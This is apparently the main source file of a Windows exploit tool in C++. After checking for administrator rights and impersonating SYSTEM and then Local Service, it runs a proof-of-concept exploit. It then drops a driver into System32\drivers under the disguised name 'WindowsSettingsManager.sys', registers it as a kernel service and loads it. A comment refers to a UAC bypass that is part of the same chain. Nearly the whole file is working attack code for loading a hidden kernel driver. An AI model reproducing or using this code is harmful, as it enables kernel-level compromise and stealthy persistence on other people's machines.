#include "pch.hpp"
#include "poc.hpp"
#include "impersonate.hpp"
#include "includes.hpp"
#include "defs.hpp"
#include "MemoryManager.hpp"
#include <filesystem>
#include <winternl.h>
#include <iostream>

bool LoadDriver(PCWSTR Driver){
    UNICODE_STRING driver_service_name;
    RtlInitUnicodeString(&driver_service_name, Driver);
    NTSTATUS status = ZwLoadDriver(&driver_service_name);
    if (status == STATUS_SUCCESS){
        return true;
    } else {
        return false;
    }
}

bool UnloadDriver(PCWSTR Driver){
    UNICODE_STRING driver_service_name;
    RtlInitUnicodeString(&driver_service_name, Driver);
    NTSTATUS status = ZwUnloadDriver(&driver_service_name);
    if (status == STATUS_SUCCESS){
        return true;
    } else {
        return false;
    }
}

bool AddToReg(const wchar_t* imagePath){
    HKEY hKey;
    LPCWSTR subKey = L"SYSTEM\\CurrentControlSet\\Services\\WindowsSettingsManager";

    LONG result = RegCreateKeyW(
        HKEY_LOCAL_MACHINE,
        subKey,
        &hKey
    );
    if (result != ERROR_SUCCESS){
        return false;
    }

    result = RegSetValueExW(
        hKey,
        L"ImagePath",
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(imagePath),
        static_cast<DWORD>((wcslen(imagePath) + 1) * sizeof(wchar_t))
    );

    if (result != ERROR_SUCCESS){
        return false;
    }

    DWORD typeValue = 1;
    result = RegSetValueExW(hKey, L"Type", 0, REG_DWORD,
    reinterpret_cast<const BYTE*>(&typeValue), sizeof(typeValue));

    if (result != ERROR_SUCCESS) return false;

    RegCloseKey(hKey);

    return true;


}

bool DropDriver(const std::string& DriverPath){
    try{
        std::filesystem::copy(DriverPath, "C:\\Windows\\System32\\drivers\\WindowsSettingsManager.sys", std::filesystem::copy_options::overwrite_existing);
        std::filesystem::remove(DriverPath);

    } catch (const std::filesystem::filesystem_error& e) {
        return false;
    }
    return true;
}

INT APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    // Check for admin rights
    if (!impersonate->is_elevated()) {
		log_debug("You need to run this program as an administrator."); //if this happens you guys probarly forgot the UAC bypass
        std::cin.get();
		return EXIT_FAILURE;
	}
    
    // First impersonate from admin to SYSTEM, then from SYSTEM to Local Service.
    impersonate->impersonate_as_system();
    impersonate->impersonate_as_local_service();

    // Execute the exploit
    poc->act();

    std::cin.get();

    if (!DropDriver("C:\\WindowsSettingsManager\\Driver.sys")){
        return EXIT_FAILURE;
    }

    bool status = AddToReg(L"\\SystemRoot\\System32\\drivers\\WindowsSettingsManager.sys");


    if (!status){
        return EXIT_FAILURE;
    }

    status = LoadDriver(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\WindowsSettingsManager");
    if (!status){
        return EXIT_FAILURE;
    }


    return EXIT_SUCCESS;
}